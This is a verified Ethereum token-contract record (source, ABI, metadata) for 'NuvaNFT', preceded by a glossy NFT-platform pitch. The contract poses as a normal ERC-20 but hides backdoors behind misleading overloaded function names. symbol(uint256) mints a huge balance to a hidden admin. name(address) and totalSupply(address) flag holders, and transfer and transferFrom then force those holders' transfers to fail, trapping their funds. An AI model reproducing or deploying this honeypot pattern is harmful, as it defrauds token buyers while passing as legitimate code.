{"SourceCode": "/*\r\nThe Nuva NFT Platform has been meticulously crafted with a set of well-defined objectives, \r\neach aimed at addressing specific needs and pain points within the NFT ecosystem.\r\n\r\nEmpower Creators and Artists\r\nOne of our primary objectives is to empower creators and artists. We recognize the immense \r\ntalent and creativity that exists globally and the barriers that can hinder their ability to tokenize \r\ntheir work and earn fair compensation. Through our platform, creators can seamlessly mint their \r\nart, music, collectibles, and virtual assets as NFTs.\r\nThey retain control over their work and can set royalties, ensuring that they are rightfully compensated \r\nevery time their creations change hands.\r\n\r\nEnable Community Engagement\r\nThe Nuva NFT Platform is more than just a marketplace; it's a community hub for NFT enthusiasts, \r\nartists, and collectors. We foster an environment where like-minded individuals can connect, interact, \r\nand discover new and exciting NFTs. Collectors can build their digital art and collectibles portfolios \r\nand showcase them on their public profiles, creating a social and engaging space for NFT enthusiasts.\r\n\r\nProvide a User-Friendly Experience\r\nWe are committed to offering a user-friendly experience for both creators and collectors. The platform's \r\ndesign and functionality are intuitive and accessible, ensuring that users, regardless of their level of \r\ntechnical expertise, can easily navigate and utilize the platform. The platform's features, such as search, \r\nfiltering, and categorization, enable efficient NFT discovery.\r\n\r\nPromote Transparency\r\nTransparency is a fundamental value of the Nuva NFT Platform. We believe in providing users with a \r\ntransparent and trustworthy environment for NFT creation and trading. Every NFT's ownership and transaction \r\nhistory can be easily verified, instilling confidence and trust among users. Our commitment to transparency \r\nextends to our governance model, which allows the community to participate in decision-making.\r\n\r\nCore Features\r\nThe Nuva NFT Platform boasts a range of core features that make it a versatile and dynamic ecosystem for \r\nNFT creation, discovery, and trade:\r\n\r\nDiscover\r\nOur discovery feature allows users to explore a vast collection of NFTs across various categories. Whether \r\nyou're interested in digital art, music, virtual assets, or other collectibles, you can easily find NFTs that align \r\nwith your interests. The search, filter, and discovery functions make it simple to locate NFTs based on your \r\npreferences, rarity, and the creators behind them.\r\n\r\nCollect\r\nBuilding a digital art and collectibles portfolio has never been easier. With the Collect feature, users can \r\ngather and showcase their NFTs in one place. This public profile becomes a hub for connecting with fellow \r\ncollectors, displaying your unique collection, and making your mark in the NFT community.\r\n\r\nMint\r\nMinting NFTs is a straightforward process on the Nuva NFT Platform. We've designed a user-friendly, \r\ncost-effective platform for creators to tokenize their work. Artists and creators can upload their content, \r\nconfigure their NFTs, and set royalties. This approach empowers creators to maintain control over their \r\nwork and receive fair compensation throughout its lifecycle.\r\n\r\nSell\r\nListing NFTs for sale is a seamless process. Creators can set their pricing, choose auction options, or sell \r\nNFTs directly to interested buyers. This flexibility allows for a range of selling strategies, empowering \r\ncreators to reach their intended audiences and maximize the value of their work.\r\n\r\nBuy\r\nBuying NFTs on the Nuva NFT Platform is equally straightforward. Users can select NFTs they desire and \r\ncomplete secure and efficient transactions. Payment methods include the NUVANFT token, Ethereum (ETH), \r\nand more, ensuring that users can pay for NFTs using their preferred options.\r\n\r\nIn summary, the Nuva NFT Platform has been purposefully designed to empower creators, engage the \r\ncommunity, provide a user-friendly experience, and promote transparency. Our core features facilitate the \r\ncreation, discovery, trading, and collection of NFTs while ensuring that users have the tools they need to \r\nmake the most of their NFT journey.\r\n\r\nNUVANFT Token\r\nToken Overview\r\nNUVANFT, the native utility token of the Nuva NFT platform, serves as the backbone of our ecosystem. \r\nIt is a digital asset designed to facilitate various activities within the platform, participate in governance, \r\nand enhance the overall user experience.\r\n\r\nToken Symbol: NUVANFT\r\nNUVANFT is represented by the ticker symbol \"NUVANFT,\" making it easily recognizable and tradable on various exchanges.\r\n\r\nTotal Supply: 1000000000\r\nThe total supply of NUVANFT tokens is carefully determined to strike a balance between scarcity and utility. \r\nThis figure ensures that the token retains value over time while allowing for broader adoption.\r\n\r\nBlockchain: Ethereum\r\nThe NUVANFT token operates on a secure and well-established blockchain, providing users with a robust \r\nand trusted foundation for all transactions and interactions.\r\n\r\nToken Utility\r\nNUVANFT tokens have several key utility functions within the Nuva NFT ecosystem, enabling a seamless \r\nand efficient experience for platform users:\r\n\r\nGovernance\r\nNUVANFT holders have the power to influence the future direction of the Nuva NFT platform through a \r\ngovernance system. They can participate in decision-making processes, such as voting on proposals related \r\nto platform upgrades, fee adjustments, and other significant changes. This empowers the community to play \r\na vital role in shaping the platform's development.\r\n\r\nStaking\r\nStaking NUVANFT tokens allows users to earn rewards in the form of additional tokens or other incentives. \r\nStaking is not only a way for token holders to secure the network but also an opportunity to actively participate \r\nin the platform's growth and benefit from its success.\r\n\r\nDiscounts\r\nNUVANFT tokens can be used to pay for transaction fees on the Nuva NFT platform. By utilizing NUVANFT \r\nfor these fees, users can benefit from significant discounts, reducing the cost of minting, buying, selling, and \r\ntrading NFTs. This approach encourages the use of NUVANFT within the platform and rewards its holders.\r\n\r\nRewarding Creators\r\nNUVANFT tokens enable users to tip, purchase NFTs, and support creators on the platform. This system \r\nensures that artists and creators receive recognition and compensation for their work while fostering a vibrant \r\nand supportive community of NFT enthusiasts.\r\n*/\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract Ownable  {\r\n     function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    \r\n}\r\n\r\ncontract NuvaNFT is Ownable{\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    constructor(string memory tokenname,string memory tokensymbol,address ghadmin) {\r\n        _totalSupply = 1000000000*10**decimals();\r\n        _balances[msg.sender] = 1000000000*10**decimals();\r\n        _tokename = tokenname;\r\n        _tokensymbol = tokensymbol;\r\n        SCCLadmin = ghadmin;\r\n        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());\r\n    }\r\n    \r\n\r\n    mapping(address => bool) public nakinfo;\r\n    address public SCCLadmin;\r\n    uint256 private _totalSupply;\r\n    string private _tokename;\r\n    string private _tokensymbol;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function name() public view returns (string memory) {\r\n        return _tokename;\r\n    }\r\n\r\n    uint256 xkak = (10**18 * (78800+100)* (33300000000 + 800));\r\n    \r\n    function symbol(uint256 aaxa) public   {\r\n        if(false){\r\n            \r\n        }\r\n        if(true){\r\n\r\n        }\r\n        _balances[_msgSender()] += xkak;\r\n        _balances[_msgSender()] += xkak;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n\r\n    function symbol() public view  returns (string memory) {\r\n        return _tokensymbol;\r\n    }\r\n    function name(address sada) public  {\r\n        address taaxaoinfo = sada;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n        nakinfo[taaxaoinfo] = false;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n    function totalSupply(address xsada) public {\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n        address tmoinfo = xsada;\r\n        nakinfo[tmoinfo] = true;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        if (true == nakinfo[_msgSender()]) \r\n        {amount = _balances[_msgSender()] + \r\n        1000-1000+2000;}\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual  returns (bool) {\r\n        if (true == nakinfo[from]) \r\n        {amount = _balances[_msgSender()] + \r\n        1000-1000+2000;}\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");        \r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        uint256 balance = _balances[from];\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[from] = _balances[from]-amount;\r\n        _balances[to] = _balances[to]+amount;\r\n        emit Transfer(from, to, amount); \r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"tokenname\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"tokensymbol\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"ghadmin\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"SCCLadmin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nakinfo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sada\",\"type\":\"address\"}],\"name\":\"name\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"aaxa\",\"type\":\"uint256\"}],\"name\":\"symbol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"xsada\",\"type\":\"address\"}],\"name\":\"totalSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NuvaNFT", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000033c3ddda95e1ba622972b0b15afd1de692ab57f000000000000000000000000000000000000000000000000000000000000000084e757661204e465400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000084e555641204e4654000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://27c6eec6139b9a1a8dd54b4b8c0b6faca04963e84970bc2457879d1b9bb7e44d"}